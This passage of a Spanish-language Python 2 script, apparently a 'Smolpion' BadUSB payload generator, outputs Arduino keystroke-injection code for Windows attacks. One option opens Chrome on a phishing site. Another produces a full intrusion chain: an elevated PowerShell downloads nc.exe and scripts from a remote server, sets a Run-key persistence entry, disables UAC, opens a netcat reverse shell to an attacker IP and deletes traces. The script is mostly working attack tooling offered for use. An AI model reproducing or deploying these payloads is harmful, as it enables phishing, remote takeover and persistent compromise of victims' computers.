\x1b[0;1;37mESTE ATAQUE DE PHISHING ESTA PREPARADO PARA FUNCIONAR BAJO CHROME.

\x1b[1;33m** PERO EL USUARIO PUEDE MODIFICAR EL CÒDIGO PARA OTROS NAVEGADORES ** """
    print
    import re
    ten_serv = raw_input("\x1b[1;36mINGRESA TU SITIO DE PHISHING:>> ")
    ten_serv_reem = {"(" : "*","/" : "&",")" : "(","=" : ")","’" : "-","-" : "/","ñ" : ";",";" : "<","¡" : "=",":" : ">","_" : "?","”" : "@","`" : "[","+" : "]","&" : "^","?" : "_","<" : "`","^" : "{","*" : "}",">" : "~",'“' : "@",'"' : "@","‘" : "-","'" : "-"}  
    regex = re.compile("(%s)" % "|".join(map(re.escape, ten_serv_reem.keys())))  
    new_ten_serv = regex.sub(lambda x: str(ten_serv_reem[x.string[x.start() :x.end()]]), ten_serv)
    print 

    ten_real = raw_input("\x1b[1;36mINGRESA LA URL DEL SITIO REAL:>> ")
    ten_real_reem = {"(" : "*","/" : "&",")" : "(","=" : ")","’" : "-","-" : "/","ñ" : ";",";" : "<","¡" : "=",":" : ">","_" : "?","”" : "@","`" : "[","+" : "]","&" : "^","?" : "_","<" : "`","^" : "{","*" : "}",">" : "~",'“' : "@",'"' : "@","‘" : "-","'" : "-"}  
    regex = re.compile("(%s)" % "|".join(map(re.escape, ten_real_reem.keys())))  
    new_ten_real = regex.sub(lambda x: str(ten_real_reem[x.string[x.start() :x.end()]]), ten_real)
    print 

    ten_cade1 = (new_ten_serv)
    ten_cade2 = """");"""
    ten_cade3 = '''Keyboard.print("'''
    ten_cade4 = (new_ten_real)

    print """
\033[0;1;32mCOMPILA EL SIGUIENTE CODIGO EN TU DISPOSITIVO SMOLPION CON EL IDE DE ARDUINO.

\x1b[0;1;37m#include "Keyboard.h"

void typeKey(uint8_t key) {
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup() {
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  delay(3000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("chrome.exe""",
    ten_concaty ="{0}{1}"
    print ten_concaty.format(ten_cade1, ten_cade2)
    print"""
  typeKey(KEY_RETURN);

  delay(3000);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('l');
  Keyboard.releaseAll();

  delay(800);"""
    print
    ten_secconcaty ="  {0}{1}{2}"
    print ten_secconcaty.format(ten_cade3, ten_cade4, ten_cade2)
    print"""

  delay(1000);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('f');
  Keyboard.releaseAll();

  Keyboard.print("a");

  typeKey(KEY_TAB);

  typeKey(KEY_TAB);

  typeKey(KEY_TAB);

  typeKey(KEY_RETURN);

  typeKey(KEY_TAB);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}"""
#__________________________________________
elif eleccion == 9:
  print"""
\x1b[1;33mPARA LLEVAR A CABO ESTE ATAQUE, ES NECESARIO SUBIR NC Y LOS SIGUIENTES ARCHIVOS A UN SERVIDOR REMOTO
\x1b[0;1;37m____________________________

\x1b[1;1;32mejecutor.vbs:

\x1b[1;31mset objshell = createobject("wscript.shell")
objshell.run "c:\windows\system32\orden.bat",vbhide
\x1b[0;1;37m____________________________

\x1b[1;1;32mpersist.bat:

\x1b[1;31mreg.exe add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "tskname" /t REG_SZ /d "C:\windows\system32\ejecutor.vbs" /f 

\x1b[0;1;37m____________________________

\x1b[1;1;32morden.bat:

\x1b[1;31mnc -d -e cmd.exe IP_ATACANTE PUERTO

\x1b[0;1;37m____________________________ 

\x1b[1;1;32mdes_uac.bat

\x1b[1;31mreg.exe add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f

\x1b[0;1;37m____________________________ """


  print
  import re 
  ejec = raw_input("\x1b[1;36mINGRESA LA RUTA DE ejecutor.vbs: >> ")
  ejec_reem = {"(" : "*","/" : "&",")" : "(","=" : ")","’" : "-","-" : "/","ñ" : ";",";" : "<","¡" : "=",":" : ">","_" : "?","”" : "@","`" : "[","+" : "]","&" : "^","?" : "_","<" : "`","^" : "{","*" : "}",">" : "~",'“' : "@",'"' : "@","‘" : "-","'" : "-"}  
  regex = re.compile("(%s)" % "|".join(map(re.escape, ejec_reem.keys())))  
  new_ejec = regex.sub(lambda x: str(ejec_reem[x.string[x.start() :x.end()]]), ejec)
  print 

  persi = raw_input("\x1b[1;36mINGRESA LA RUTA DE persist.bat: >> ")
  persi_reem = {"(" : "*","/" : "&",")" : "(","=" : ")","’" : "-","-" : "/","ñ" : ";",";" : "<","¡" : "=",":" : ">","_" : "?","”" : "@","`" : "[","+" : "]","&" : "^","?" : "_","<" : "`","^" : "{","*" : "}",">" : "~",'“' : "@",'"' : "@","‘" : "-","'" : "-"}  
  regex = re.compile("(%s)" % "|".join(map(re.escape, persi_reem.keys())))  
  new_persi = regex.sub(lambda x: str(persi_reem[x.string[x.start() :x.end()]]), persi)
  print

  orde = raw_input("\x1b[1;36mINGRESA LA RUTA DE orden.bat: >> ")
  orde_reem = {"(" : "*","/" : "&",")" : "(","=" : ")","’" : "-","-" : "/","ñ" : ";",";" : "<","¡" : "=",":" : ">","_" : "?","”" : "@","`" : "[","+" : "]","&" : "^","?" : "_","<" : "`","^" : "{","*" : "}",">" : "~",'“' : "@",'"' : "@","‘" : "-","'" : "-"}  
  regex = re.compile("(%s)" % "|".join(map(re.escape, orde_reem.keys())))  
  new_orde = regex.sub(lambda x: str(orde_reem[x.string[x.start() :x.end()]]), orde)
  print

  desuac = raw_input("\x1b[1;36mINGRESA LA RUTA DE des_uac.bat: >> ")
  desuac_reem = {"(" : "*","/" : "&",")" : "(","=" : ")","’" : "-","-" : "/","ñ" : ";",";" : "<","¡" : "=",":" : ">","_" : "?","”" : "@","`" : "[","+" : "]","&" : "^","?" : "_","<" : "`","^" : "{","*" : "}",">" : "~",'“' : "@",'"' : "@","‘" : "-","'" : "-"}  
  regex = re.compile("(%s)" % "|".join(map(re.escape, desuac_reem.keys())))  
  new_desuac = regex.sub(lambda x: str(desuac_reem[x.string[x.start() :x.end()]]), desuac)
  print

  nc = raw_input("\x1b[1;36mINGRESA LA RUTA DE nc.exe: >> ")
  nc_reem = {"(" : "*","/" : "&",")" : "(","=" : ")","’" : "-","-" : "/","ñ" : ";",";" : "<","¡" : "=",":" : ">","_" : "?","”" : "@","`" : "[","+" : "]","&" : "^","?" : "_","<" : "`","^" : "{","*" : "}",">" : "~",'“' : "@",'"' : "@","‘" : "-","'" : "-"}  
  regex = re.compile("(%s)" % "|".join(map(re.escape, nc_reem.keys())))  
  new_nc = regex.sub(lambda x: str(nc_reem[x.string[x.start() :x.end()]]), nc)
  
  nine_cade1 = """Keyboard.print("$down ) New/Object System.Net.WebClient< $url ) -""" 
  nine_cade2 = (new_nc)
  nine_cade3 = """-< $file ) -nc.exe-< $down.DownloadFile*$url,$file(< $down ) New/Object System.Net.WebClient< $url ) -"""
  nine_cade4 = (new_ejec)
  nine_cade5 = """-< $file ) -ejecutor.vbs-< $down.DownloadFile*$url,$file(< $down ) New/Object System.Net.WebClient< $url ) -"""
  nine_cade6 = (new_persi)
  nine_cade7 = """-< $file ) -persist.bat-< $down.DownloadFile*$url,$file(< $down ) New/Object System.Net.WebClient< $url ) -"""
  nine_cade8 = (new_orde)
  nine_cade9 = """-< $file ) -orden.bat-< $down.DownloadFile*$url,$file(< $down ) New/Object System.Net.WebClient< $url ) -"""
  nine_cade10 = (new_desuac)
  nine_cade11 = """-< $file ) -des?uac.bat-< $down.DownloadFile*$url,$file(");"""
  print """
  \033[0;1;32mCOMPILA EL SIGUIENTE CODIGO EN TU DISPOSITIVO SMOLPION CON EL IDE DE ARDUINO.

  \x1b[0;1;37m#include "Keyboard.h"

  void typeKey(uint8_t key) {
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup() {
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  delay(3000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("powershell start/process powershell /verb runas");

  typeKey(KEY_RETURN);

  delay(4000);

  typeKey(KEY_LEFT_ARROW);

  typeKey(KEY_RETURN);

  delay(4000);"""
  print
  nine_concaty ="  {0}{1}{2}{3}{4}{5}{6}{7}{8}{9}{10}"
  print nine_concaty.format(nine_cade1, nine_cade2, nine_cade3, nine_cade4, nine_cade5, nine_cade6, nine_cade7, nine_cade8, nine_cade9, nine_cade10, nine_cade11)
  print"""

typeKey(KEY_RETURN);

  delay(9000);

  Keyboard.print("persist.bat");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("des?uac.bat");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("del persist.bat< del des?uac.bat");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("ejecutor.vbs< exit");

  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}"""
#__________________________________________
elif eleccion == 0:
  print"""\x1b[0;1;32m   
           ooooooooooooooooooo++/////+ooooooooooooooooooo
	   oooooooooooooo+:-`          `.:+oooooooooooooo
	   ooooooooooooo+`                 `:oooooooooooo
	   ooooooooooooooo.      ``          `/sooooooooo
	   ooooooooo:.:oooo:./osyyyyso/.       -ssooooooo
	   ooooooo+-...-osoossyyyyyyyyyyo-      -yssooooo
	   oooooo/......./ssoossyyyyyyyyyy/      /yyssooo
	   ooooo:.........:sysoossyyyysoooo`     .oooosso
	   ooo+-...........-oyssoossyy/               +ys
	   oo+...............+yyysoossy+`           `oyyy
	   oooooss-.....-sssssyyyyysoosss.         -syyyy
	   oooossy+....../yyyyyyyyyyysooss/       /yyyyyy
	   ooooooss:......:syyyyyyyyyyysoos+`   `oyyyyyyy
	   ooooooooo:.......:+osyyyyso/-/sooo. -syyyyyyyy
	   oooooooooo/...........--......:ssoooyyyyyyyyyy
	   oooooooooooo/-.................-sysoosyyyyyyyy
	   sssssssssssssso+:-..........-:+syyyysssssyyyyy
	   ooooooooooooooossysso+++oosyyyyyyyyyyyssossyyy
	   sssssssoosssosoosssyyyyyyyyyyyyyyyyyyyyysssssy 
                   \x1b[0;1;31mSMOLPION STRING CONVERTER V1.0
  \x1b[0;1;37m                
        \x1b[0;1;37mCreated By  \x1b[0;1;35m:\x1b[0;1;36m  Raphael Molina                       
        \x1b[0;1;37mFollow me   \x1b[0;1;35m:\x1b[0;1;36m  facebook.com/AccessGrantedChannel 
    """
  print """\x1b[0;1;32mESTE SCRIPT AYUDA A CONVERTIR LO QUE DESEES QUE TU DISPOSITIVO SMOLPION ESCRIBA.
EVITANDO ASI PROBLEMAS CON LA CONFIGURACIÓN DEL TECLADO ESPAÑOL.

\x1b[0;1;37mEJEMPLO:
SI DESEAS EJECUTAR UNA CONSOLA COMO ADMINISTRADOR DESDE LA VENTANA ´EJECUTAR´ 
DE WINDOWS CON LA INSTRUCCIÓN: 
\x1b[0;1;31mpowershell Start-process cmd -Verb runAs

\x1b[0;1;37mDEBERIAS COMPILAR TU DISPOSITIVO SMOLPION CON LA INSTRUCCIÓN: 
\x1b[0;1;31mpowershell Start/process cmd /Verb runAs

\x1b[0;1;33mPERO NO TE PREOCUPES!!!, ESCRIBE LAS INSTRUCCIONES Y COMANDOS COMO NORMALMENTE
LO HARIAS Y ESTE SCRIPT TE LAS DEVOLVERÁ LISTAS PARA SU COMPILACIÓN"""
  print
  print
  import re  
  cadena = raw_input("\033[0;1;32mINGRESA TU STRING:'‘>> ")  
  reemplazo = {"(" : "*","/" : "&",")" : "(","=" : ")","’" : "-","-" : "/","ñ" : ";",";" : "<","¡" : "=",":" : ">","_" : "?","”" : "@","`" : "[","+" : "]","&" : "^","?" : "_","|" : "`","^" : "{","*" : "}",">" : "~",'“' : "@",'"' : "@","‘" : "-","'" : "-"}  
  regex = re.compile("(%s)" % "|".join(map(re.escape, reemplazo.keys())))  
  nueva_cadena = regex.sub(lambda x: str(reemplazo[x.string[x.start() :x.end()]]), cadena) 
  print 
  print
  print """\033[0;1;37m:""", 
  print nueva_cadena
